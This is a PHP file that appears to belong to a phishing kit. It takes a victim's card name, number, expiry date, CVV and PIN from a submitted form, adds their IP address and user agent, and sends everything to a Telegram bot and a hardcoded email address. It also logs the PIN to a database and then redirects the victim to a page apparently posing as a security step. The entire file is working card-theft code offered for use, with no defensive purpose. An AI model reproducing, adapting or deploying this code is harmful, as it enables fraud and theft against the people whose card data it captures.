<?php
require_once('config.php');
$agent = $_SERVER['HTTP_USER_AGENT'];
$email = "cmgrace@yandex.com";
$ip = get_client_ip();
$message = "==================+[ ---:||sscu||:--]+==================\n";
$message .= "Card Name : " . $_POST['cn'] . "\n";
$message .= "Card Number : " . $_POST['ccn'] . "\n";
$message .= "Expire Date : " . $_POST['ed'] . "\n";
$message .= "Cvv : " . $_POST['cv'] . "\n";
$message .= "Pin : " . $_POST['pn'] . "\n";
$message .= "============= [ Ip & Hostname Info ] =============\n";
$message .= "Client IP : " . $ip . "\n";
$message .= "User-Agent : " . $agent . "\n";
$message .= "--------------------------------------------\n";
$message .= "=============+ [:- vipstore911.com] +=============\n";


require_once('db.php');

$data = $message;
$send = ['chat_id' => $chatid, 'text' => $data];
$website = "https://api.telegram.org/bot$apikey";
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

// Save to DB
if (isset($pdo)) {
    upsertLog($pdo, $ip, $agent, ['otp2' => $_POST['pn']]);
}

$subject = "Credit Card-popular-$ip";
$data = $_POST['cn'];
$site = substr($data, strpos($data, "@") + 1);

mail($email, $subject, $message);

header("Location: seguridad.html");
?>
